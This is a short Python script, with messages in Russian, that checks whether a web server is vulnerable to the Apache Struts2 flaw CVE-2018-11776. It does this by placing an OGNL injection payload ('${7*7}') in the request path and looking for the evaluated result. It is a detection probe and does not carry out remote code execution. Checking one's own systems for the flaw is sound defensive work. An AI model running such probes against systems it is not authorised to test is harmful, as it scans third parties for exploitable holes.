import requests
import sys


def main(target_url):
    payload = "${7*7}"

    test_url = f"{target_url}/struts2-showcase/{payload}/help.action"

    try:
        response = requests.get(test_url, timeout=5, verify=False)

        if "49" in response.text:
            print("Потенциальная уязвимость CVE-2018-11776 обнаружена!")
        else:
            print("Уязвимость не подтверждена.")
            print(f"Код ответа: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Ошибка при подключении: {e}")
        sys.exit(1)


if __name__ == "__main__":

    TARGET = "https://example.com"
    main(TARGET)